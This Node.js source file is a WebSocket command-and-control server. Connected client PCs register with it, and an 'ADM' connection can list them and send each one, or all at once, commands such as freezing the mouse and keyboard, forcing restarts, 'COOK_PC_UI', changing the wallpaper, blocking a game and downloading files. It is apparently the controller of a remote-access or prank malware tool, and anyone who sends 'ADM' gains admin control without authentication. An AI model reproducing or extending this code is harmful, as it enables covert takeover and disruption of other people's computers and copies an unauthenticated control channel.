const { WebSocketServer } = require("ws");
const { randomUUID } = require("crypto");

const clients = new Map();
const PORT = 8602;

const wss = new WebSocketServer({ port: PORT });

console.log("Server listening on port:", PORT);

// PONG to all clients of type CLIENT every 5 seconds
setInterval(() => {
  for (const client of clients.values()) {
    try {
      if (client?.type === "CLIENT" && client.socket && client.socket.readyState === 1) {
        client.socket.send("PONG");
      }
    } catch (e) {
    }
  }
}, 5000);

const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "COOK_PC_UI", "CHANGE_WALLPAPER", "BLOCK_VALORANT", "UNBLOCK_VALORANT", "DOWNLOAD", "BYE"]; // ! TEXT_ IS A SPECIAL COMMAND
const knownSpecialCommands = ["ALL"];

wss.on("connection", (socket) => {
  let clientUUID = null;

  socket.on("message", (data) => {
    const msg = data.toString().trim();

    if (msg.startsWith("HELLO_")) {
      const name = msg.substring(6);

      if (!name) {
        socket.send("ERROR_INVALID_NAME")
        socket.close();
        return;
      }

      clientUUID = randomUUID();

      clients.set(clientUUID, {
        uuid: clientUUID,
        name,
        type: "CLIENT",
        socket
      });

      console.log(`New connection ${name} (${clientUUID})`);

      socket.send(`WELCOME`);
      return;
    } else if (msg === "ADM") {
      if (clientUUID) return;

      clientUUID = randomUUID();
      clients.set(clientUUID, {
        uuid: clientUUID,
        name: "ADM",
        type: "ADM",
        socket
      });

      socket.send("WELCOME_ADM");
      console.log(`New connection ADM (${clientUUID})`);

      return;
    }

    else if (msg === "LIST_CLIENTS") {
      if (clients.get(clientUUID)?.type !== "ADM") {
        socket.send("ERROR_UNAUTHORIZED");
        return;
      }

      let response = "";
      for (const [id, c] of clients) {
        if (c.type === "ADM") continue;
        response += `${c.name} (${c.uuid})\n`;
      }
      socket.send(response || "NO_CLIENTS");
      return;
    } else if (msg.includes("|")) {
      if (msg.includes("DOWNLOAD") || msg.length <= 80)
        console.log(`Received: [${msg}] from an ADM.`);
      else {
        console.log("Message too big, rejecting...");
        socket.send("Message to big, max 80 characters.");
        
        return;
      }

      const parts = msg.split("|");
      const firstPart = parts[0];
      const command = parts[1];
      const arg1 = parts[2];

      if (clients.get(clientUUID)?.type !== "ADM") {
        socket.send("ERROR_UNAUTHORIZED");
        return;
      }

      if (!knownCommands.includes(command) && !command.startsWith("TEXT_")) return;

      if (knownSpecialCommands.includes(firstPart.toUpperCase())) {
        if (firstPart.toUpperCase() === "ALL") {
          // Send to all clients
          for (const [_, c] of clients) {
            if (c.type === "ADM") continue;

            if (arg1) {
              c.socket.send(`${command}|${arg1}`);
              continue;
            }

            c.socket.send(command);
          }
        }
        socket.send(`${command} Sent to all clients..`);

        return;
      }

      const client = clients.get(firstPart); // First part here is the UUID

      if (!client) {
        socket.send("ERROR_INVALID_UUID");
        return;
      }

      if (arg1)
        client.socket.send(`${command}|${arg1}`);
      else
        client.socket.send(command);

      return;
    } else if (msg != "PING") {
      socket.send("Invalid command.");

      return;
    }
  });

  socket.on("close", () => {
    if (clientUUID) {
      console.log(`Client disconnected: ${clientUUID}`);
      clients.delete(clientUUID);
    }
  });

  socket.on("error", (err) => {
    console.error("Socket error:", err.message);
  });
});